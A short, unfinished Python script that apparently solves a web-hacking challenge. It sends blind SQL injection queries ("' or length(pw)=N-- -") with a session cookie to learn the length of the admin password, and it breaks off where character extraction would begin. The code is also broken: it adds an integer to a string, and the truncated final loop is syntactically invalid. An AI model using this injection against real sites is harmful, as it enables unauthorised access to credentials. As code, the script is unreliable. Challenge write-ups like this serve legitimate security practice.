import requests

flag = ""
length = 0

url = ""
session = dict(PHPSESSID="")

print("[+] start")

print("[+] find length")

for i in range (0, 20):
    try:
        query = url + "?id=' or length(pw)=" + i + "-- -"
        r = requests.post(query, cookies=session)

    except:
        print("[-] error occur")

    if "Hello admin" in r.text:
        length = i;
        break;

print("[+] length = ", length)

for j in range(0, )
